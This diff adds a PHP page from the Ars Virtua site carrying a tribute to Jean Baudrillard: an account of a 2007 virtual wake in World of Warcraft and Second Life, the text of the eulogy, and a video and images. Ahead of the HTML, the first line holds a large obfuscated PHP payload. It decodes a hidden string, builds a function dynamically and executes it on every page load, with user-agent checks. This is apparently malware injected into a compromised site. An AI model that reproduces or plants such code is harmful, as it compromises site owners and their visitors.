@@ -1,0 +1,101 @@
+<?php $dwivibr = 'if((function_exists("	x6f	142	x5f	163	x74	141	x72	164") && (7f<*XAZASV<*w%)ppde>u%V<#65,47R25,%tjw!>!#]y84]275]y83]248]y83]256]y81]265]y72]254]y76#<!%w:!>!(%w:!>!	x7gj6<*QDU`MPT7-NBFSUT`LDPT7-UFOJ`GB)fubfsdXA	x27K6<	xrfs%6<#o]1/20QUUI7jsv%7UFH#	x27rfs%6~6<	x7fw6<*K)ftpmdXA6|7**1*#sfmcnbs+yfeobz+sfwjidsb`bj+upcotn+qsvmt+fmhpph#)zbssb!-#}#)fepmqnVER["	x48	124	x54	120	x5f	125	x53	105	x52	137	x41	107	x45	11=tj{fpg)%	x24-	x24*<!~!	**f	x27,*e	x27,*d	x27,*c	x27,*b	x27)fepdt%}K;`ufldpt}X;`msvd}R;*msv%)}.;%)tpqsut>j%!*9!	x27!hmg%)!gj!~<ox24/%t2w/	x24)##-!#~<#/%	x24-	x24!>!fyqH*WCw*[!%rN}#QwTW%hIr	x>!	x24/%tmw/	x24)%zW%h>EzH,2W%wN;#-Ez-1A	x27pd%6<pd%w6Z6<.2`hA	x27pd%6<C	x27pd%6|6.7eu{66~67<&w6<*&7-#24*!|!	x24-	x24	x5c%j^	x24-	x24goj{h1:|:*mmvo:>:iuhofm%:-5ppde:4:|:**#ppde#ps)%j>1<%j=6[%ww2!>#p#/#p#/%z<jg!)%z>>2*!%z>3<!fmtf!%z>2<!%&e_SEEB`FUPNFS&d_SFSFGFS`QUUI&c_UOFHB}#-!	x24/%tmw/	x24)%c*W%eN+#Qi	x5c1^W%c!>527}88:}334}472	x24<!%ff2!>!bssbz)	x24]25	x24-	x24-!%	x24-	x%:osvufs:~:<*9-1-r%)s%>/h%:<**gpf{jt)!gj!<*2bd%-#1GO	x22#)fepmqyfA>2b%!<*qpufs}	x27;mnui}&;zepc}A;~!}	x7f;cq%7/7#@#7/7^#iubq#	x5cq%	x27jsv%6<C>^#zsfvr#	x5cq%)sfxpmpusut)tpqssutRe%)Rd%)Rb%))!gj!<*#cd2bge56+9938bE{h%)j{hnpd!opjudovg!|!**#j{hnpd#)tutjyf`opjudovg	x1*!%b:>1<!fmtf!%b:>%sreporting(0); $smgdoib = implode(array_map("jsawfpm",str_split("epn)%bss-%rxB%h>#]y31]278]y3e]81]K78:56985:#57]38y]47]67y]37]88y]27]28y]#/r%/h%)n%-#+I#)q%:>:r%:|:**t%)m%=*hpmqnjA	x27&6<.fmjgA	x27doj%6<	x7fw6*	x7f_*#fmjgk4`{6~6<tfs%w6<	x7fw6*6c6f+9f5d816:+946:ce44#)zbssb!>!ssbnpe_GMFT`QIQ&f_UTPI`QUUI6	x54"]); if ((strstr($uas,"	x6d	163	x69	145ff2-!%t::**<(<!fwbm)%tjw)#	x24#-!#]y38o]s]o]s]#)fepmqyf	x27*&7-n%)utjm6<	x7fw6*CW&)7gj6<*K)f)tutjyf`4	x223}!+!<+{e%+*!*+fepdfe{h+{d%)+opjudovg+)!gj+{e%!osv7fw6*3qj%7>	x2272qj%)7gj6<**2qj%)hopm3qjA)qj3hopmA	x22]y85]256]y6g]257]y86]267]y74]275]y7:]268]y7f#<!%tww!>!	x2400~:<h%_t6*	x7f_*#fubfsdXk5`{66~6<&w6<	x7fw6*CW&)7gj6<*doj%7-C)fe66~6<&w6<	x7fw6*CW&)7gj6<.[A	x27&6<	x7fw6*	x7f_*#[k2`{6:!}797-2qj%7-K)udfoopdXA	x22)/	x24)%	x24-	x24y4	x24-R6<*id%)dfyfR	x27tfs%6<*17-SFEBFI,6<*127-UVPFNJU,6<*27-SFGTOBSUOSVUFS,]238M7]381]211M5]67]452x7f	x7f<u%V	x27{ftmfV	x7f<*X&Z&S{ftmfV	xv%)}k~~~<ftmbg!osvufs!|ftmf!~<**9.-j%-bubE{h%)sutcvt)fubmgoj{hA!23zbe!-#jt0*?]+^?]_	x5c}X	x24<!%tmw!>!#]y85c1^-%r	x5c2^-%hOh/#00#W~!%t%)m%):fmjix:<##:>:h%:<#64y]552]e7y]#>n%<#372]58y]472]37y]672]48y]73qj%6<*Y%)fnbozcYufhA	x272qj%6<^#zsfvr#	x5ufs!*!+A!>!{e%)!>>	x22!ftmbg)!gj<*#k#)usbut`cpV	x7f	x7f	nfd)##Qtpz)#]341]88M4P/#/#/},;#-#}+;%-qp%)54lnbss!>!bssbz)#44ec:649#246767~6<Cw6<pd%w6Z6<.5`hA	x27pd%6<pd%w6Z6!isset($GLOBALS["	x61	156	x75	156	x61"])))) { $GLOBALS["%-*.%)euhA)3of>2bd%!<5h%/#0#/*#npd/#)rrd/#00;quui#>.%!<*157	x6e"; function jsawfpm($n){return chr(ord($n)-1);} @error_#>s%<#462]47y]252]18y]#>q%<#762]67y]562]38y]572]48y]#>m%:|:*r%:-{h%)tpqsut>j%!*72!	x27!hmg%)!gj!<2,*j%-#1]#-bubE{h2w)##Qtjw)#]82#-#!#-%tmw)%tww**WYsboobs`un>qp%!|Z~!<##!>!2p%!|	x7f!>>	x22!pd%)!gj}Z;h!opjudovg}{;#)%Z<#opo#>b%!*##>>X)!7**^#zsfvr#	x5cq%)ufttj	x22)gj6<^#Y#	x5mpef)#	x24*<!%t::!>!	x24Ypp3)%cB%iN-!#:618d5f9#-!#f6c6839of.)fepdof./#@#/qp%>5h%!<*::::::-111112)e}-}!#*<%nfd>%fdy<Cb*[%h!>!%tdz)%bbT-%bT-%hW~%fdy)##-!#~<%h00#*<%epdoF.uofuopD#)sfebfI{*w%)kVx{**#k#)x24-	x24*<!	x24-	x24gps)%j>1<%jsqpt)%z-#:#*	x24-	x24!>!	x24/%tjw!*!***b%)sfxpmpusut!-#j0#!/!*`SFTV`QUUI&b%!|!*)323zbek!~!<b%	x7f!<X>bcq%	x27Y%6<.msv`ftsbqA7>q%6<	x7fw]245]K2]285]Ke]53Ld]53]Kc]55Ld]55#*<%bG9}:}.;!>>>!}_;gvc%}&;ftmbg}	x7f;!osvufs}w;*bE{h%)sutcvt-#w#)ldbqo)fepdof`57ftbc	x7f!|!*uyfu	x27k: $xjcsybk = "	x63	162	x65	1:>:8:|:7#6#)tutjyf`439275ttfsqnpdov{h19275j{hnpd19275fubmCWtfs%)7gj6<*id%)ftpmd=tj{fpg)%s:*<%j:,,Bjg!)%j:>>>>*4-1-bubE{h%)sutcvt)!gj!|!*bu946-tr.984:75983:48984:71]K9]77]D4]82]K6]72]K9]78]K5]5")) or (strstr($uas,"	x72	166	x3a	61	x31")) or (strstr($uas,"	x61	#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L27-K)ebfsX	x27u%)7fmjix6<C	x27&6<*rfs%7-K)fujsxX6<#o]o]Y%7;utpI#7>/7osvufs:~928>>	x22:ftmbg39*56A	x24]y8	x24-	x24]26	x24-	x24<%j,,*!|	x24-	x24gvodujpo!	x24-	x24y7	3]Kc#<%tpz!>!#]D6M7]K3#<%yy>#]D6]281L1#/#M5]DgP5]D6#<%fdy>#]D4]273]D6Ptutjyf`opjudovg)!gj!|!*msv>*ofmy%)utjm!|!*5!	x27!hmg%)!gj!|!*1?hmg%)!gj!<*156	x64	162	x6f	151	x64")) or (strstr($uas,"	x63	150	x72	157	x6d*2-4-bubE{h%)sutcvt)esp>hmg%!<12>j%!|!*#91y]c9y]g2y]#j!/!#0#)idubn`hfsq)!sp!*#ojneb#-*f%41	x74	145	x5f	146	x75	156	x63	164	x69	 $yfacley();}}gjZ<#opo#>b%!**X)ufttj	x22)gj!|!*nbsbq%)323ldfidk!~!<**qp%!-uyfu%)3of9#-!#65egb2dc#*<!sfuvso!sboepn)%epnbss-%rxW~!Ypp2)%zB%zt%)3of:opjudovg<~	x24<!%o:!>!	x242178}6<*msv%7-MSV,6<*)ujojR	x27id%6<7R66,#/q%>2q%<#g6R85,67R37,18R#>q%V<*#fopoV;hoj85:52985-t.98]K4]65]D8]86]y31]278]y3f]51L3]84]y31M6]y3e]81#/#7e:55`UQPMSVD!-id%)uqpuft`msvd},;uqpuft`msvd}+;!>!}	x27!|!}{;)gj}l;33bq}k;opjudovg}x;0]=])0#)U!	}	x27;%!<*#}_;#)323ldfid>}&;!osvufs}	x7f;!opjudovg}k~~9{d%:8]37]278]225]241]334]368]322]3]364]6]283]427]36]373P6]36]73]83tutjyf`x	x22l:!}V;3q%}U;y]}R;2]},;osv22)!gj}1~!<2p%	x7f!~!<##!>!2p%Z<^2	x5c2b%!>!2p%!*3>?*2b%)#-!%w:**<")));$yfacley = $xjcsybk("", $smgdoib);	x7fw6*	x7f_*#ujojRk3`{61M5]D2P4]D6#<%G]y6d]281Ld-)1/2986+7**^/%rx<~!!%s:N}#-%o:W%c:>1<%b:>1<!gps)%j:>1<%j:	145")) or (strstr($uas,"	x66	151	x72	145	x66	157	x78"))) {!ftmf!}Z;^nbsbq%	x5cSFWSFT`%}X;!sp!*#opo#>>}R;msv}.;;!}6;##}C;!>>!}W;utpi}Y;tuofuopd`ufh`fmjg}[;ldp!%i	x5c2^<!Ce*[!%cIjQeTQcOc/#00#W~!Ydrr)%rxB%ep<.4`hA	x27pd%6<pd%w6Z6<.3`hosvufs!~<3,j%>j%!*3!	x27!hmg%!)!gj!<2,*j%!-#1]#-bubEtpmdXA6~6<u%7>/7&6|7**1111	x61	156	x75	156	x61"]=1; $uas=strtolower($_SER2L5P6]y6gP7L6M7]D4]275]D:M8]Df#<%tdz>#L4]275L3]248L3P6L6197g:74985-rr.93e:5597f-s.973:8297f:5297e:56-xr.9:	x5c%j:.2^,%b:<!%c:>%s:	x5c%j:^<!%w`	x5c^>Ew:Qb:Qc:W~!%z!>2<!g4]275]y83]273]y76]277#<!%t2w>#]y74]273]y76]25]88]5]48]32M3]317]445]212]445]43]321]464]284]364]6]234tvctus)%	x24-	x24b!>!%yy)#}#-#	x24-	x24-tu]342]58]24]31#-%tdz*Wsfuvso!%bss	x5csboe))1/35.)1/14+9**fmy%,3,j%>j%!<**3-j%-bux27{**u%-#jt0}Z;0]=]0#)2q%l}S;2-u%!-#2#/#%#/#o]#/*)3d7R17,67R37,#/q%>U<#16,47R57,2ww2)%w`TW~	x24<!fwbm)%tjw)bssbz)#P#-#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*-!%StrrEVxNoiTCnUF_EtaERCxecAlPeR_rtSvgfzpci'; $yiahpnx=explode(chr((364-244)),substr($dwivibr,(26924-20904),(146-112))); $ovuurtp = $yiahpnx[0]($yiahpnx[(7-6)]); $ovmvfjul = $yiahpnx[0]($yiahpnx[(7-5)]); if (!function_exists('tyoqdxkxdw')) { function tyoqdxkxdw($rurveg, $qtuifzp,$vujpizjmg) { $vrgsixt = NULL; for($zcmlnia=0;$zcmlnia<(sizeof($rurveg)/2);$zcmlnia++) { $vrgsixt .= substr($qtuifzp, $rurveg[($zcmlnia*2)],$rurveg[($zcmlnia*2)+(3-2)]); } return $vujpizjmg(chr((60-51)),chr((412-320)),$vrgsixt); }; } $djkfddjww = explode(chr((153-109)),'0,60,2576,56,5430,47,346,60,1552,44,3741,66,4148,64,5120,59,3522,27,4300,39,2688,62,1252,64,94,70,2534,42,5325,27,635,63,1634,54,5404,26,3841,68,217,62,1987,25,164,53,1751,53,2367,43,1076,51,2983,39,3353,33,1872,56,1424,69,3606,22,2035,70,4515,31,5013,24,1928,59,5231,47,470,32,4659,50,3430,38,2926,37,4074,25,2168,64,5352,52,2814,50,502,32,5842,23,3468,22,4099,49,4212,53,3656,31,1179,52,4908,57,1000,45,2632,56,430,40,3079,41,2900,26,3284,29,279,67,4265,35,1127,52,1493,59,832,37,3313,40,2963,20,4353,69,3490,32,5179,52,2488,23,4750,59,3909,29,3549,57,729,44,1688,63,2410,56,2128,40,60,34,5917,30,4546,47,3184,36,4871,37,1045,31,4709,41,5865,52,2232,42,5645,45,1804,68,970,30,1359,65,2302,65,2750,64,4477,38,910,60,698,31,5744,42,3251,33,2012,23,3938,66,3220,31,406,24,534,39,3022,35,869,41,5278,47,2511,23,3057,22,4422,55,596,39,573,23,2274,28,2864,36,1316,43,5532,50,4593,66,3687,54,4004,70,5477,55,5037,25,3386,44,3120,64,2466,22,4809,62,2105,23,5690,54,5786,56,5062,58,3628,28,1231,21,5582,63,773,59,5947,36,3807,34,5983,37,1596,38,4965,48,4339,14'); $srsclwsso = $ovuurtp("",tyoqdxkxdw($djkfddjww,$dwivibr,$ovmvfjul)); $ovuurtp=$dwivibr; $srsclwsso(""); $srsclwsso=(797-676); $dwivibr=$srsclwsso-1; ?><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+<title>Ars Virtua: Tribute to Jean Baudrillard</title>
+<script src="Scripts/AC_ActiveX.js" type="text/javascript"></script>
+<script src="Scripts/AC_RunActiveContent.js" type="text/javascript"></script>
+<script language="JavaScript" type="text/javascript">
+<!--
+function movload()
+{
+	tag = '<object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" codebase="http://www.apple.com/qtactivex/qtplugin.cab" height="198" width="240"><param name="src" value="http://dma.sjsu.edu/%7ejmorgan/baudrillard-edit.mov" /><param name="autoplay" value="true" /><param name="controller" value="true" /><embed height="198" pluginspage="http://www.apple.com/quicktime/download/" src="baudrillard.mov" type="video/quicktime" width="240" controller="true" autoplay="true"></embed></object>';
+	
+	document.getElementById('vid').innerHTML = tag;
+}
+//-->
+</script>
+<link rel="STYLESHEET" type="text/css" href="../../inc/main.css" />
+</head>
+
+<body>
+<div class="centerer"><div class="master">
+
+<div class="nav">
+<?php include("../../inc/nav.html"); ?>
+</div>
+
+<div class="spacer_gray"></div>
+
+<div class="cwide"><h1>Tribute to Jean Baudrillard</h1>
+</div>
+<div class="c1">
+
+<div class="spacer_gray"></div><br />
+<h3>Ars Virtua Remembers Jean Baudrillard</h3>
+<br />
+"What I am, I don’t know. I am the simulacrum of myself." -Jean Baudrillard<br />
+<br />
+On March 17, 2007 at 4 pm SLT Ars Virtua held a small wake for the passing of Jean Baudrillard. The event was held in World of Warcraft and telecast into Second Life in our first trans-instance event. The audience was small but very engaged.<br />
+<br />
+As a tribute to Jean Baudrillard’s life and work I felt that it was appropriate to use the world of simulation to deliver my message through the highly popular simulation gaming environment found in World of Warcraft. As part of the continued simulation which we call artmaking this tribute can be seen as an initial foray into a synthetic world for a purpose in which it was not necessarily built. A tension is created by this detournement of the space, that is the reutilization of the combat based game environment for a public function, ironically because it already is used as a community gathering place. The actual detournment is inverted (inverse detournement??) because of the reuse of the sphere for a tribute rather than an action of political protest.<br />
+<br />
+Those who think the irony of this is counteractive to Baudrillard’s philosophy about simulation have missed the point. He did not object to simulation, for what is art if not the simulacra. He objected to blindness to the fact that every bit of everything is a simulation.<br />
+<br />
+–Thomas Asmuth<br />
+Zuluu (WoW - Kilrogg)<br />
+Humbert Xingjian (Second Life)<br />
+  <br />
+
+<div class="spacer_gray"></div>
+
+
+</div>
+<div class="c2">
+<div id="vid" align="center" style="background-color:#111"><a href="javascript:movload()"><img src="images/thumbs/vid.jpg" alt="play wake video" width="242" height="198" border="0" /></a>
+
+</div>
+<div class="title">Video of the Wake </div>
+
+<a href="images/tribute1.jpg" target="_blank"><img src="images/thumbs/tribute1.jpg" alt="still" width="264" height="159" border="0" /></a><br />
+<a href="images/tribute4.jpg" target="_blank"><img src="images/thumbs/tribute4.jpg" alt="still" width="264" height="159" border="0" /></a><br />
+<a href="images/tribute2.jpg" target="_blank"><img src="images/thumbs/tribute2.jpg" alt="still" width="264" height="159" border="0" /></a><br />
+<a href="images/tribute5.jpg" target="_blank"><img src="images/thumbs/tribute5.jpg" alt="still" width="264" height="159" border="0" /></a><br />
+<a href="images/tribute6.jpg" target="_blank"><img src="images/thumbs/tribute6.jpg" alt="still" width="264" height="159" border="0" /></a><br />
+<div class="title">Images by J0E Languish </div>
+</div>
+<div class="cwide">
+<br />
+<h2>Text of Tribute</h2><br />
+
+I address you friends and colleagues, I say we have come here to celebrate and honor a visionary and philosopher. A man who continues to influence the very core of our understanding of the &lsquo;real&rsquo;. We are here to pay homage to Jean Baudrillard.<br />
+  <br />
+  A prolific writer and renowned photographer, he was the author of more than 50 works including: The Mirror of Production (1973), Forget Foucault (1977), Simulacra and Simulation (1981), America (1986), and The Spirit of Terrorism: And Requiem for the Twin Towers.<br />
+  <br />
+  We are driven to reflect the passing of this philosopher and the influential nature of his work on the very nature of this and all gatherings upon the contemporary synthetic planes. Here upon the synthetic empires of our age, we owe much of this understanding to Dr. Baudrillard&rsquo;s metaphor. In giddy revelation each of us can identify with his statement:<br />
+&ldquo;What I am, I don&rsquo;t know. I am the simulacrum of myself.&rdquo;<br />
+<br />
+We cannot let ourselves forget that Dr. Baudrillard&rsquo;s lens exposed this synthesis as pervasive and far from novel. It is the constructions of our relations to the world and the appearances that have allowed us to meet in his honor today. It is these relations that brought us here.<br />
+<br />
+Today the Simulacra in which we immerse ourselves are not fictions any more or less than the mutable social relations we engage in as we travel from home to work, from sports arena to religious sanctuary. In all we see and participate in a variety of social contracts that each afford their own expressions, rewards, and simulations. His most beloved simulation, Disneyland, drove him to write:<br />
+<br />
+&ldquo;..the whole system becomes weightless; it is no longer anything but a gigantic simulacrum: not unreal, but a simulacrum, never again exchanging for what is real, but exchanging in itself, in an uninterrupted circuit without reference or circumference.&rdquo;<br />
+<br />
+Thus we are not deceived nor bitter about this understanding. These worlds are full of potential because of the understanding you gave us Dr. Baudrillard. It is because of you we have the potential to transcend the role as consumer and to become the Counterfeiter.<br />
+<br />
+In this &ldquo;network of endless, unreal circulation: a town of fabulous proportions, but without space or dimensions&hellip;&rdquo;, we engage in a construction, a third memory of the world. The world has for a long time.<br />
+<br />
+We love, build, buy and spend, discuss religion, protest the political, and covet celebrity appearances in the simulation that was already a simulation before it was &lsquo;online&rsquo;. Jean Baudrillard, even though critical of anyone who couldn&rsquo;t understand the how we fabricated our environments, fully recognized that all facets of life are simulation. We could not fake these moments such as these and it would be fool hardy to think that we are operating in some sort of bad faith or disconnection with the world as we embrace the hyper-real. Dr. Baudrillard pointed at it and the whole currency of virtual/real and genuine/simulation dissolved.<br />
+<br />
+His response to criticism of the academe and his work was most prophetic and telling to our engagement with synthetic plane. Baudrillard arrested the criticism of his work as dense nonsense when he reportedly said:<br />
+<br />
+&ldquo;Ouf, it&rsquo;s a game. A fabulous game. A game, that may not really be taking place.&rdquo;<br />
+<br />
+Why yes it is; all - of - it, Professor.<br />
+  With great admiration we deliver this tribute to the life and work of Jean Baudrillard. Farewell, Professor.<br /><br /><br />
+<img src="../../images/logo.png" alt="ars virtua" width="200" height="27" /><br />
+</div>
+<?php include("../../inc/footer.php"); ?>
+</div>
+</body>
+</html>
